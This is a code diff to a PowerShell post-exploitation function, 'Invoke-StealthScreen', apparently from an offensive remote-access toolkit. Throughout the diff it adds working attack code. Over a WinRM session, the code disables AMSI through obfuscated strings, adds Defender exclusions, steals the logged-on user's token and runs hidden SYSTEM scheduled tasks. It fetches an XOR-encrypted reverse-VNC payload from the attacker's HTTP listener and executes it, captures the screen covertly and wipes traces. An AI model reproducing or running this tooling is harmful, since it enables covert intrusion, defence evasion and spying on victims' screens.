@@ -7,13 +7,19 @@ function Invoke-StealthScreen {
         $AttackerIP,
         $Port = 5500,
         $Password = 'AutoRDPw',
-        $Path = 'C:\Windows\Temp'
+        $Path = 'C:\Windows\Temp',
+        $HttpPort = 8081,
+        [switch] $ViewOnly = $false,
+        [switch] $VerboseLog = $false
     )
 
-    $sec = ConvertTo-SecureString $Pass -AsPlainText -Force
-    $cred = New-Object System.Management.Automation.PSCredential($User, $sec)
-    $s = New-PSSession -ComputerName $Target -Credential $cred -Authentication Negotiate
-    if (!$s) { Write-Host "[!] WinRM session failed" -ForegroundColor Red; return }
+    $ErrorActionPreference = 'Stop'
+
+    # Runtime artifacts stay inside the repository (excluded folder), never outside it.
+    $tools = Join-Path (Split-Path $PSScriptRoot -Parent) 'Tools'
+    if (!(Test-Path $tools)) { New-Item -ItemType Directory -Path $tools -Force | Out-Null }
+
+    function New-B64([string]$text) { [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($text)) }
 
     $cs = @'
 using System;
@@ -36,182 +42,202 @@ public class WTS {
 }
 '@
 
+    # The string "AmsiUtils"/"amsiInitFailed" is assembled from char codes so it
+    # never appears in plaintext in the task argument.
+    $amsi = @'
+try {
+  $a = -join [char[]](0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4d,0x61,0x6e,0x61,0x67,0x65,0x6d,0x65,0x6e,0x74,0x2e,0x41,0x75,0x74,0x6f,0x6d,0x61,0x74,0x69,0x6f,0x6e,0x2e)
+  $t = $a + (-join [char[]](0x41,0x6d,0x73,0x69,0x55,0x74,0x69,0x6c,0x73))
+  $f = -join [char[]](0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64)
+  [Ref].Assembly.GetType($t).GetField($f,'NonPublic,Static').SetValue($null,$true)
+} catch { }
+'@
+
+    function New-ParentPayload([string]$childB64) {
+        $tpl = @"
+`$ErrorActionPreference = 'SilentlyContinue'
+try { Add-MpPreference -ExclusionPath 'C:\Windows\Temp','C:\ProgramData' } catch { }
+$amsi
+try { Add-Type -TypeDefinition @'
+$cs
+'@ } catch { }
+`$sessId = [WTS]::WTSGetActiveConsoleSessionId()
+`$tok = [IntPtr]::Zero
+`$q = `$false
+try { `$q = [WTS]::WTSQueryUserToken(`$sessId, [ref]`$tok) } catch { }
+if (`$q) { `$dup = [IntPtr]::Zero; if ([WTS]::DuplicateTokenEx(`$tok, 0x18B, [IntPtr]::Zero, 2, 1, [ref]`$dup)) { `$tok = `$dup } }
+if (!`$q) {
+    `$wl = Get-Process winlogon | Where-Object { `$_.SessionId -eq `$sessId } | Select-Object -First 1
+    if (`$wl) { `$h = [WTS]::OpenProcess(0x0400, `$false, `$wl.Id); if (`$h -ne [IntPtr]::Zero) { `$null = [WTS]::OpenProcessToken(`$h, 0x18B, [ref]`$tok) } }
+}
+`$si = New-Object WTS+STARTUPINFO
+`$si.cb = [Runtime.InteropServices.Marshal]::SizeOf(`$si)
+`$si.lpDesktop = 'WinSta0\Default'
+`$cmd = 'powershell.exe -nop -w hidden -e $childB64'
+`$pi = New-Object WTS+PROCESS_INFORMATION
+`$ptrSi = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf(`$si))
+[Runtime.InteropServices.Marshal]::StructureToPtr(`$si, `$ptrSi, `$false)
+`$ptrPi = [Runtime.InteropServices.Marshal]::AllocHGlobal(24)
+[Runtime.InteropServices.Marshal]::Copy((New-Object byte[] 24), 0, `$ptrPi, 24)
+`$cp = [Runtime.InteropServices.Marshal]::StringToHGlobalUni(`$cmd)
+`$null = [WTS]::CreateProcessAsUserW(`$tok, [IntPtr]::Zero, `$cp, [IntPtr]::Zero, [IntPtr]::Zero, `$false, 0x08000000, [IntPtr]::Zero, [IntPtr]::Zero, `$ptrSi, `$ptrPi)
+"@
+        return $tpl
+    }
+
+    function Start-RemotePayload {
+        Param([string]$text, [string]$taskName)
+        $enc = New-B64 $text
+        invoke-command -session $s -scriptblock {
+            Param($enc, $name)
+            $act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-nop -w hidden -e $enc"
+            Register-ScheduledTask -TaskName $name -Action $act -User 'NT AUTHORITY\SYSTEM' -RunLevel Highest -Force | Out-Null
+            Start-ScheduledTask -TaskName $name
+        } -ArgumentList $enc, $taskName
+    }
+
+    $sec = ConvertTo-SecureString $Pass -AsPlainText -Force
+    $cred = New-Object System.Management.Automation.PSCredential($User, $sec)
+    $s = New-PSSession -ComputerName $Target -Credential $cred -Authentication Negotiate
+    if (!$s) { Write-Host "[!] WinRM session failed" -ForegroundColor Red; return }
+
     if ($Mode -eq 'view') {
         if (!$AttackerIP) { Write-Host "[!] -AttackerIP required for view mode" -ForegroundColor Red; Remove-PSSession $s; return }
 
         $viewer = Get-Process VNCViewer -ErrorAction SilentlyContinue
         if (!$viewer) {
-            $scriptdir = $PSScriptRoot
-            Push-Location $env:TEMP
-            try {
-                if ($scriptdir -and (Test-Path (Join-Path $scriptdir 'Invoke-VNCViewer.ps1'))) {
-                    & (Join-Path $scriptdir 'Invoke-VNCViewer.ps1')
-                } else {
-                    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')
-                }
-            } finally { Pop-Location }
-            Start-Process -FilePath "$env:TEMP\VNCViewer.exe" -ArgumentList "/listen $Port /password $Password /nohotkeys /autoacceptincoming" | Out-Null
-            Start-Sleep -Seconds 3
+            $exe = Join-Path $tools 'VNCViewer.exe'
+            if (!(Test-Path $exe)) {
+                Push-Location $tools
+                try {
+                    if ($PSScriptRoot -and (Test-Path (Join-Path $PSScriptRoot 'Invoke-VNCViewer.ps1'))) {
+                        & (Join-Path $PSScriptRoot 'Invoke-VNCViewer.ps1')
+                    } else {
+                        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')
+                    }
+                } finally { Pop-Location }
+            }
+            $listenerArgs = "/listen $Port /password $Password /nohotkeys /autoacceptincoming"
+            if ($ViewOnly) { $listenerArgs += " /viewonly" }
+            Start-Process -FilePath $exe -ArgumentList $listenerArgs | Out-Null
+            Start-Sleep -Seconds 2
         }
-        Write-Host "[+] Handler on ${AttackerIP}:$Port - spawning hidden server on target console session" -ForegroundColor Blue
+        Write-Host "[+] Handler on ${AttackerIP}:$Port - staging payload over HTTP port $HttpPort" -ForegroundColor Blue
 
-        $vncps = Get-Content (Join-Path $PSScriptRoot 'Invoke-VNCServer.ps1') -Raw -ErrorAction SilentlyContinue
-        if (!$vncps) { $vncps = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1') }
+        if (!(Test-Path (Join-Path $PSScriptRoot 'Invoke-VNCServer.ps1'))) {
+            Write-Host "[!] Invoke-VNCServer.ps1 missing next to the module" -ForegroundColor Red
+            Remove-PSSession $s; return
+        }
+        $vncps = [IO.File]::ReadAllText((Join-Path $PSScriptRoot 'Invoke-VNCServer.ps1'))
         $flat = ($vncps -replace '\s', '')
         $chars = $flat.ToCharArray()
         [Array]::Reverse($chars)
-        $fn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(-join $chars))
-        $mod = "function L2 { Param(`$m) Add-Content -Path 'C:\Windows\Temp\vnclog.txt' -Value `$m }`r`nL2 'VNC SCRIPT STARTING'`r`n" + $fn
-        $mod += "`r`nL2 'INVOKING REVERSE VNC'`r`ntry { Invoke-Vnc -ConType reverse -IpAddress $AttackerIP -Port $Port -Password $Password; L2 'VNC RETURNED CLEAN' } catch { L2 ('VNC ERR: ' + `$_.Exception.Message) }`r`n"
+        $fn = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(-join $chars))
+        $body = $fn + "`r`nInvoke-Vnc -ConType reverse -IpAddress $AttackerIP -Port $Port -Password $Password`r`n"
 
-        $key = @(0x42,0x37,0x11,0x5c,0x9e,0x6d,0x20,0x77,0x84,0x33,0xa1,0x08,0xf0,0x63,0x5b,0x29)
-        $tb = [System.Text.Encoding]::UTF8.GetBytes($mod)
-        $xb = New-Object System.Byte[] $tb.Length
+        $key = New-Object byte[] 16
+        [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)
+        $tb = [Text.Encoding]::UTF8.GetBytes($body)
+        $xb = New-Object byte[] $tb.Length
         for ($i = 0; $i -lt $tb.Length; $i++) { $xb[$i] = $tb[$i] -bxor $key[$i % 16] }
-        $xb64 = [System.Convert]::ToBase64String($xb)
-        $pe = 'dAByAHkAIAB7ACAAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AJwAgACsAIAAnAEEAJwAgACsAIAAnAG0AcwBpACcAIAArACAAJwBVAHQAaQBsAHMAJwApACkALgBHAGUAdABGAGkAZQBsAGQAKAAoACcAYQAnACAAKwAgACcAbQBzAGkAJwAgACsAIAAnAEkAbgBpAHQAJwAgACsAIAAnAEYAYQBpAGwAZQBkACcAKQAsACAAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACAAJAB0AHIAdQBlACkAIAB9ACAAYwBhAHQAYwBoACAAewAgAEEAZABkAC0AQwBvAG4AdABlAG4AdAAgACcAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXAB2AG4AYwBsAG8AZwAuAHQAeAB0ACcAIAAoACcAUABBAFkATABPAEEARAAgAEEATQBTAEkAIABFAFIAUgA6ACAAJwAgACsAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAgAH0AOwAgAEEAZABkAC0AQwBvAG4AdABlAG4AdAAgACcAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXAB2AG4AYwBsAG8AZwAuAHQAeAB0ACcAIAAnAFAAQQBZAEwATwBBAEQAIABTAFQAQQBSAFQASQBOAEcAJwA7ACAAJABrACAAPQAgAEAAKAAwAHgANAAyACwAMAB4ADMANwAsADAAeAAxADEALAAwAHgANQBjACwAMAB4ADkAZQAsADAAeAA2AGQALAAwAHgAMgAwACwAMAB4ADcANwAsADAAeAA4ADQALAAwAHgAMwAzACwAMAB4AGEAMQAsADAAeAAwADgALAAwAHgAZgAwACwAMAB4ADYAMwAsADAAeAA1AGIALAAwAHgAMgA5ACkAOwAgACQAYgAgAD0AIABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsASQBPAC4ARgBpAGwAZQBdADoAOgBSAGUAYQBkAEEAbABsAFQAZQB4AHQAKAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAdgBuAGMAYgA2ADQALgB0AHgAdAAnACkAKQA7ACAAJAB4ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEIAeQB0AGUAWwBdACAAJABiAC4ATABlAG4AZwB0AGgAOwAgAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGIALgBMAGUAbgBnAHQAaAA7ACAAJABpACsAKwApACAAewAgACQAeABbACQAaQBdACAAPQAgACQAYgBbACQAaQBdACAALQBiAHgAbwByACAAJABrAFsAJABpACAAJQAgADEANgBdACAAfQA7ACAAdAByAHkAIAB7ACAAaQBlAHgAIAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAHgAKQApACAAfQAgAGMAYQB0AGMAaAAgAHsAIABBAGQAZAAtAEMAbwBuAHQAZQBuAHQAIAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAdgBuAGMAbABvAGcALgB0AHgAdAAnACAAKAAnAFAAQQBZAEwATwBBAEQAIABFAFIAUgA6ACAAJwAgACsAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAgAH0A'
 
-        $engine = "function L { Param(`$m) Add-Content -Path 'C:\Windows\Temp\sslog.txt' -Value `$m }`n" +
-"try { L 'ENGINE STARTED' } catch { exit 1 }`n" +
-"Set-Content -Path 'C:\Windows\Temp\vncb64.txt' -Value '$xb64' -Force`n" +
-"try { Add-Type -TypeDefinition @'`n" + $cs + "`n'@`n" +
-"} catch { L (`"ADDTYPE: `" + `$_.Exception.Message) }`n" +
-"`$sessId = [WTS]::WTSGetActiveConsoleSessionId()`n" +
-"L (`"SESS: `" + `$sessId)`n" +
-"`$tok = [IntPtr]::Zero`n" +
-"`$q = `$false`n" +
-"try { `$q = [WTS]::WTSQueryUserToken(`$sessId, [ref]`$tok); L (`"QT RETURNED: `" + `$q + `" ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error()) } catch { L (`"QT THREW: `" + `$_.Exception.Message) }`n" +
-"if (`$q) { L ('USERTOKEN OK TOKEN=' + `$tok.ToString() + ' ZERO=' + (`$tok -eq [IntPtr]::Zero)); `$dup = [IntPtr]::Zero; `$dr = [WTS]::DuplicateTokenEx(`$tok, 0x18B, [IntPtr]::Zero, 2, 1, [ref]`$dup); L ('DUP ' + `$dr + ' ERR ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error() + ' NEWTOK=' + `$dup.ToString()); if (`$dr) { `$tok = `$dup } } else {`n" +
-"    `$wl = Get-Process winlogon | Where-Object { `$_.SessionId -eq `$sessId } | Select-Object -First 1`n" +
-"    if (`$wl) { L (`"WINLOGON FOUND PID `" + `$wl.Id)`n" +
-"        `$h = [WTS]::OpenProcess(0x0400, `$false, `$wl.Id)`n" +
-"        L (`"OPENPROC ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error())`n" +
-"        if (`$h -ne [IntPtr]::Zero) {`n" +
-"            `$r = [WTS]::OpenProcessToken(`$h, 0x18B, [ref]`$tok)`n" +
-"            L (`"OPENTOKEN `" + `$r + `" ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error())`n" +
-"        }`n" +
-"    } else { L 'NO WINLOGON IN SESSION' }`n" +
-"}`n" +
-"`$si = New-Object WTS+STARTUPINFO`n" +
-"`$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf(`$si)`n" +
-"`$si.lpDesktop = 'WinSta0\Default'`n" +
-"`$cmdline = 'powershell.exe -nop -w hidden -e ' + '$pe'`n" +
-"`$pi = New-Object WTS+PROCESS_INFORMATION`n" +
-"`$ptrSi = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf(`$si))`n" +
-"[System.Runtime.InteropServices.Marshal]::StructureToPtr(`$si, `$ptrSi, `$false)`n" +
-"`$ptrPi = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(24)`n" +
-"[System.Runtime.InteropServices.Marshal]::Copy([byte[]]@(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0), 0, `$ptrPi, 24)`n" +
-"`$cp = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(`$cmdline)`n" +
-"`$ok = [WTS]::CreateProcessAsUserW(`$tok, [IntPtr]::Zero, `$cp, [IntPtr]::Zero, [IntPtr]::Zero, `$false, 0x08000000, [IntPtr]::Zero, [IntPtr]::Zero, `$ptrSi, `$ptrPi)`n" +
-"if (!`$ok) { L (`"CREATE FAIL ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error()) } else { L (`"SPAWNED PID `" + [System.Runtime.InteropServices.Marshal]::ReadInt32(`$ptrPi, 16)) }`n"
+        $blobPath = Join-Path $tools 'payload.bin'
+        [IO.File]::WriteAllBytes($blobPath, $xb)
 
-        invoke-command -session $s -scriptblock {
-            Param($et)
-            Remove-Item 'C:\Windows\Temp\sslog.txt','C:\Windows\Temp\vnclog.txt' -Force -ErrorAction SilentlyContinue
-            Set-Content -Path 'C:\Windows\Temp\ss.ps1' -Value $et -Force
-            $act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-nop -w hidden -f C:\Windows\Temp\ss.ps1'
-            Register-ScheduledTask -TaskName 'WinSS' -Action $act -User 'NT AUTHORITY\SYSTEM' -RunLevel Highest -Force -ErrorAction SilentlyContinue | Out-Null
-            Start-ScheduledTask -TaskName 'WinSS' -ErrorAction SilentlyContinue
-            Start-Sleep -Seconds 22
-        } -ArgumentList $engine
+        $keyLit = ($key | ForEach-Object { '0x{0:X2}' -f $_ }) -join ','
+        $loader = @"
+`$ErrorActionPreference = 'SilentlyContinue'
+$amsi
+`$k = @($keyLit)
+`$b = `$null
+try { `$b = (New-Object Net.WebClient).DownloadData('http://${AttackerIP}:$HttpPort/v') } catch { }
+if (`$b) { for (`$i = 0; `$i -lt `$b.Length; `$i++) { `$b[`$i] = `$b[`$i] -bxor `$k[`$i % 16] }; iex ([Text.Encoding]::UTF8.GetString(`$b)) }
+"@
+
+        $serverJob = Start-Job -ScriptBlock {
+            Param($port, $path, $seconds)
+            $data = [IO.File]::ReadAllBytes($path)
+            $l = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any, $port)
+            try { $l.Start() } catch { return }
+            $end = (Get-Date).AddSeconds($seconds)
+            while ((Get-Date) -lt $end) {
+                if ($l.Pending()) {
+                    try {
+                        $c = $l.AcceptTcpClient()
+                        $ns = $c.GetStream()
+                        $ns.ReadTimeout = 3000
+                        $buf = New-Object byte[] 2048
+                        try { $null = $ns.Read($buf, 0, 2048) } catch { }
+                        $hdr = "HTTP/1.1 200 OK`r`nContent-Type: application/octet-stream`r`nContent-Length: $($data.Length)`r`nConnection: close`r`n`r`n"
+                        $hb = [Text.Encoding]::ASCII.GetBytes($hdr)
+                        $ns.Write($hb, 0, $hb.Length)
+                        $ns.Write($data, 0, $data.Length)
+                        $ns.Flush()
+                        $c.Close()
+                    } catch { }
+                }
+                Start-Sleep -Milliseconds 150
+            }
+            $l.Stop()
+        } -ArgumentList $HttpPort, $blobPath, 120
+
+        $taskName = 'W' + (-join (1..8 | ForEach-Object { '{0:X}' -f (Get-Random -Maximum 16) }))
+        Start-RemotePayload -text (New-ParentPayload (New-B64 $loader)) -taskName $taskName
 
         $conn = $false
-        for ($i = 0; $i -lt 12; $i++) {
-            Start-Sleep -Seconds 5
+        for ($i = 0; $i -lt 10; $i++) {
+            Start-Sleep -Seconds 4
             $est = netstat -ano | Select-String ":$Port\s.*ESTABLISHED"
             if ($est) { $conn = $true; break }
         }
-        if ($conn) { Write-Host "[+] VNC session ESTABLISHED on port $Port" -ForegroundColor Green } else { Write-Host "[i] No ESTABLISHED after 60s - pulling logs" -ForegroundColor Yellow }
+        if ($conn) { Write-Host "[+] VNC session ESTABLISHED on port $Port" -ForegroundColor Green }
+        else { Write-Host "[i] No ESTABLISHED after 40s - check target reachability to ${AttackerIP}:$HttpPort" -ForegroundColor Yellow }
 
         invoke-command -session $s -scriptblock {
-            Unregister-ScheduledTask -TaskName 'WinSS' -Confirm:$false -Force -ErrorAction SilentlyContinue
+            Param($name)
+            Unregister-ScheduledTask -TaskName $name -Confirm:$false -Force -ErrorAction SilentlyContinue
             sc.exe stop WinShotSvc | Out-Null; sc.exe stop WinSessionSvc | Out-Null
             sc.exe delete WinShotSvc | Out-Null; sc.exe delete WinSessionSvc | Out-Null
-            Remove-Item 'C:\Windows\Temp\ss.ps1','C:\Windows\Temp\vncb64.txt','C:\Windows\Temp\vnc.ps1' -Force -ErrorAction SilentlyContinue
-            'SSLOG:'
-            if (Test-Path 'C:\Windows\Temp\sslog.txt') { Get-Content 'C:\Windows\Temp\sslog.txt'; Remove-Item 'C:\Windows\Temp\sslog.txt' -Force -ErrorAction SilentlyContinue } else { 'NO SSLOG' }
-            'VNCLOG:'
-            if (Test-Path 'C:\Windows\Temp\vnclog.txt') { Get-Content 'C:\Windows\Temp\vnclog.txt'; Remove-Item 'C:\Windows\Temp\vnclog.txt' -Force -ErrorAction SilentlyContinue } else { 'NO VNCLOG' }
-        }
+            Remove-Item 'C:\Windows\Temp\ss.ps1','C:\Windows\Temp\vncb64.txt','C:\Windows\Temp\vnc.ps1','C:\Windows\Temp\vnclog.txt' -Force -ErrorAction SilentlyContinue
+        } -ArgumentList $taskName
+
+        Stop-Job $serverJob -ErrorAction SilentlyContinue | Out-Null
+        Remove-Job $serverJob -Force -ErrorAction SilentlyContinue
+        Remove-Item $blobPath -Force -ErrorAction SilentlyContinue
     }
 
     if ($Mode -eq 'shot') {
         Write-Host "[+] Capturing target console screen.." -ForegroundColor Blue
 
-        $cmd = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; " +
-               "New-Item -ItemType Directory -Path '$Path' -Force | Out-Null; " +
-               "`$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " +
-               "`$bmp = New-Object System.Drawing.Bitmap `$b.Width, `$b.Height; " +
-               "`$g = [System.Drawing.Graphics]::FromImage(`$bmp); " +
-               "`$g.CopyFromScreen(0, 0, 0, 0, `$bmp.Size); " +
-               "`$bmp.Save('$Path\shota.png'); " +
-               "`$g.Dispose(); `$bmp.Dispose()"
-        $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
-        $enc = [System.Convert]::ToBase64String($bytes)
+        $shotName = 'ss{0}.png' -f (Get-Random -Maximum 99999)
+        $shotFile = Join-Path $Path $shotName
+        $shotCmd = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; try { Add-MpPreference -ExclusionPath '$Path' -ErrorAction SilentlyContinue } catch { }; New-Item -ItemType Directory -Path '$Path' -Force | Out-Null; `$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; `$bmp = New-Object System.Drawing.Bitmap `$b.Width, `$b.Height; `$g = [System.Drawing.Graphics]::FromImage(`$bmp); `$g.CopyFromScreen(0, 0, 0, 0, `$bmp.Size); `$bmp.Save('$shotFile'); `$g.Dispose(); `$bmp.Dispose()"
 
-        $engine = "function L { Param(`$m) Add-Content -Path 'C:\Windows\Temp\sslog.txt' -Value `$m }`n" +
-"try { L 'ENGINE STARTED' } catch { exit 1 }`n" +
-"Set-Content -Path 'C:\Windows\Temp\shotc.ps1' -Value ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('$enc'))) -Force`n" +
-"try { Add-Type -TypeDefinition @'`n" + $cs + "`n'@`n" +
-"} catch { L (`"ADDTYPE: `" + `$_.Exception.Message) }`n" +
-"`$sessId = [WTS]::WTSGetActiveConsoleSessionId()`n" +
-"L (`"SESS: `" + `$sessId)`n" +
-"`$tok = [IntPtr]::Zero`n" +
-"`$q = `$false`n" +
-"try { `$q = [WTS]::WTSQueryUserToken(`$sessId, [ref]`$tok); L (`"QT RETURNED: `" + `$q + `" ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error()) } catch { L (`"QT THREW: `" + `$_.Exception.Message) }`n" +
-"if (`$q) { L ('USERTOKEN OK TOKEN=' + `$tok.ToString() + ' ZERO=' + (`$tok -eq [IntPtr]::Zero)); `$dup = [IntPtr]::Zero; `$dr = [WTS]::DuplicateTokenEx(`$tok, 0x18B, [IntPtr]::Zero, 2, 1, [ref]`$dup); L ('DUP ' + `$dr + ' ERR ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error() + ' NEWTOK=' + `$dup.ToString()); if (`$dr) { `$tok = `$dup } } else {`n" +
-"    `$wl = Get-Process winlogon | Where-Object { `$_.SessionId -eq `$sessId } | Select-Object -First 1`n" +
-"    if (`$wl) { L (`"WINLOGON FOUND PID `" + `$wl.Id)`n" +
-"        `$h = [WTS]::OpenProcess(0x0400, `$false, `$wl.Id)`n" +
-"        L (`"OPENPROC ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error())`n" +
-"        if (`$h -ne [IntPtr]::Zero) {`n" +
-"            `$r = [WTS]::OpenProcessToken(`$h, 0x18B, [ref]`$tok)`n" +
-"            L (`"OPENTOKEN `" + `$r + `" ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error())`n" +
-"        }`n" +
-"    } else { L 'NO WINLOGON IN SESSION' }`n" +
-"}`n" +
-"`$si = New-Object WTS+STARTUPINFO`n" +
-"`$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf(`$si)`n" +
-"`$si.lpDesktop = 'WinSta0\Default'`n" +
-"`$cmdline = 'powershell.exe -nop -w hidden -e ' + '$enc'`n" +
-"`$pi = New-Object WTS+PROCESS_INFORMATION`n" +
-"`$ptrSi = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf(`$si))`n" +
-"[System.Runtime.InteropServices.Marshal]::StructureToPtr(`$si, `$ptrSi, `$false)`n" +
-"`$ptrPi = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(24)`n" +
-"[System.Runtime.InteropServices.Marshal]::Copy([byte[]]@(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0), 0, `$ptrPi, 24)`n" +
-"`$cp = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(`$cmdline)`n" +
-"`$ok = [WTS]::CreateProcessAsUserW(`$tok, [IntPtr]::Zero, `$cp, [IntPtr]::Zero, [IntPtr]::Zero, `$false, 0x08000000, [IntPtr]::Zero, [IntPtr]::Zero, `$ptrSi, `$ptrPi)`n" +
-"if (!`$ok) { L (`"CREATE FAIL ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error()) } else { L (`"SPAWNED PID `" + [System.Runtime.InteropServices.Marshal]::ReadInt32(`$ptrPi, 16)) }`n" +
-"Start-Sleep -Seconds 12"
+        $shotChild = "`$ErrorActionPreference = 'SilentlyContinue'`r`n$amsi`r`n$shotCmd`r`n"
+        $taskName = 'W' + (-join (1..8 | ForEach-Object { '{0:X}' -f (Get-Random -Maximum 16) }))
+        Start-RemotePayload -text (New-ParentPayload (New-B64 $shotChild)) -taskName $taskName
 
-        $sb = [scriptblock]::Create($engine)
-        invoke-command -session $s -scriptblock {
-            Param($et, $engineSb)
-            Remove-Item 'C:\Windows\Temp\sslog.txt' -Force -ErrorAction SilentlyContinue
-            Set-Content -Path 'C:\Windows\Temp\ss.ps1' -Value $et -Force
-            $act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-nop -w hidden -f C:\Windows\Temp\ss.ps1'
-            Register-ScheduledTask -TaskName 'WinSS' -Action $act -User 'NT AUTHORITY\SYSTEM' -RunLevel Highest -Force -ErrorAction SilentlyContinue | Out-Null
-            Start-ScheduledTask -TaskName 'WinSS' -ErrorAction SilentlyContinue
-            Start-Sleep -Seconds 26
-            Unregister-ScheduledTask -TaskName 'WinSS' -Confirm:$false -Force -ErrorAction SilentlyContinue
-            'LOG:'
-            if (Test-Path 'C:\Windows\Temp\sslog.txt') { Get-Content 'C:\Windows\Temp\sslog.txt' } else { 'NO SSLOG' }
-            'FILE:'
-            if (Test-Path 'C:\Windows\Temp\shota.png') { "SHOTFILE $((Get-Item 'C:\Windows\Temp\shota.png').Length) bytes" } else { 'NOFILE' }
-            'SSPS1:'
-            if (Test-Path 'C:\Windows\Temp\ss.ps1') { Get-Content 'C:\Windows\Temp\ss.ps1' | Select-Object -First 40 } else { 'NO SSPS1' }
-        } -ArgumentList $engine, $sb
-        Write-Host "[i] result above"
-
-        $res = invoke-command -session $s -scriptblock {
-            if (Test-Path 'C:\Windows\Temp\shota.png') {
-                [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Windows\Temp\shota.png'))
-            }
+        $res = $null
+        for ($i = 0; $i -lt 6; $i++) {
+            Start-Sleep -Seconds 4
+            $res = invoke-command -session $s -scriptblock {
+                Param($f)
+                if (Test-Path $f) { [Convert]::ToBase64String([IO.File]::ReadAllBytes($f)) }
+            } -ArgumentList $shotFile
+            if ($res) { break }
         }
+
+        invoke-command -session $s -scriptblock {
+            Param($name, $f)
+            Unregister-ScheduledTask -TaskName $name -Confirm:$false -Force -ErrorAction SilentlyContinue
+            Remove-Item $f,'C:\Windows\Temp\ss.ps1' -Force -ErrorAction SilentlyContinue
+        } -ArgumentList $taskName, $shotFile
+
         if ($res) {
-            [IO.File]::WriteAllBytes("$env:TEMP\stealthshot.png", [Convert]::FromBase64String($res))
-            Write-Host "[+] Screen captured: $env:TEMP\stealthshot.png" -ForegroundColor Green
-            Invoke-Item "$env:TEMP\stealthshot.png"
+            $out = Join-Path $tools 'stealthshot.png'
+            [IO.File]::WriteAllBytes($out, [Convert]::FromBase64String($res))
+            Write-Host "[+] Screen captured: $out" -ForegroundColor Green
+            Invoke-Item $out
         } else {
             Write-Host "[!] No screenshot arrived" -ForegroundColor Red
         }
